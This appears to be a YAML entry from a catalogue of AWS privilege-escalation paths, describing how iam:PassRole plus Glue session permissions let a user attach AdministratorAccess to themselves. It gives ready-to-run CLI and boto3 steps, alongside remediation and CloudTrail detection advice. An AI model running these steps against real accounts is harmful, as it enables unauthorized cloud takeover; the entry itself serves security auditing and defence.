id: glue-007
name: iam:PassRole + glue:CreateSession + glue:RunStatement
category: new-passrole
services:
  - iam
  - glue

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM role to the Glue service
    - permission: glue:CreateSession
      resourceConstraints: No resource constraints required
    - permission: glue:RunStatement
      resourceConstraints: Must be able to run statements in the created session
  additional:
    - permission: glue:GetSession
      resourceConstraints: Useful for polling session status until it reaches READY before running statements
    - permission: glue:ListSessions
      resourceConstraints: Helpful for discovering existing sessions and their associated roles
    - permission: glue:DeleteSession
      resourceConstraints: Useful for cleaning up the malicious session after exploitation
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: A principal with `iam:PassRole`, `glue:CreateSession`, and `glue:RunStatement` can escalate privileges by creating an AWS Glue Interactive Session that passes an admin IAM role, then running arbitrary Python code in that session using boto3. The Python code executes with the admin role's credentials — injected automatically by the Glue service — and calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user. No Glue job, job definition, or S3 script is required; the code runs inline via `glue:RunStatement`.

prerequisites:
  admin:
    - A role must exist that trusts glue.amazonaws.com to assume it
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
    - A role must exist that trusts glue.amazonaws.com and has elevated permissions

exploitationSteps:
  awscli:
    - step: 1
      command: |
        aws glue create-session \
          --id privesc-glue-session \
          --role arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --command '{"Name":"glueetl","PythonVersion":"3"}' \
          --glue-version "4.0" \
          --worker-type "G.1X" \
          --number-of-workers 2
      description: Create a Glue Interactive Session, passing the admin role via iam:PassRole. The session will initialize with that role's credentials available to all statements run within it.
    - step: 2
      command: |
        aws glue get-session \
          --id privesc-glue-session \
          --query 'Session.Status' \
          --output text
      description: Poll session status until it reaches READY. This typically takes 1-2 minutes as Glue provisions the session workers.
    - step: 3
      command: |
        aws glue run-statement \
          --session-id privesc-glue-session \
          --code "
        import boto3
        iam = boto3.client('iam')
        iam.attach_user_policy(
            UserName='STARTING_USER',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        print('AdministratorAccess attached successfully')
        "
      description: Run a Python statement within the session. The boto3 client automatically uses the session's injected admin role credentials. The statement calls iam:AttachUserPolicy to attach AdministratorAccess to the starting user.
    - step: 4
      command: |
        aws glue get-statement \
          --session-id privesc-glue-session \
          --id STATEMENT_ID \
          --query 'Statement.State' \
          --output text
      description: Poll statement status until it reaches AVAILABLE. Once complete, check Statement.Output.Data.TextPlain for the output confirming the policy was attached.
    - step: 5
      command: |
        aws iam list-attached-user-policies \
          --user-name STARTING_USER
      description: Verify that AdministratorAccess is now attached to the starting user, confirming privilege escalation success.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative Glue session roles** - Very rarely does a Glue Interactive Session need administrative IAM access. Use the principle of least privilege and scope session roles to only the data sources the session legitimately needs.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificGlueSessionRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "glue.amazonaws.com"
      }
    }
  }
  ```

  - **Restrict `glue:CreateSession`** - Interactive sessions allow running arbitrary code with any passed role. Only trusted data engineering principals should have this permission.
  - **Restrict `glue:RunStatement`** - Running statements in existing sessions can be used to abuse a session originally created by another principal. Scope this permission carefully.
  - Monitor CloudTrail for unusual Glue Interactive Session creation followed by immediate statement execution
  - Monitor CloudTrail for Glue sessions created by principals who do not normally use interactive sessions
  - Monitor CloudTrail for roles being passed to Glue that haven't been used before
  - Alert on IAM policy attachment events originating from Glue session execution roles
  - Regularly audit all IAM roles that trust glue.amazonaws.com and down-scope any with administrative access

limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks. Glue Interactive Sessions typically take 1-2 minutes to reach READY state.

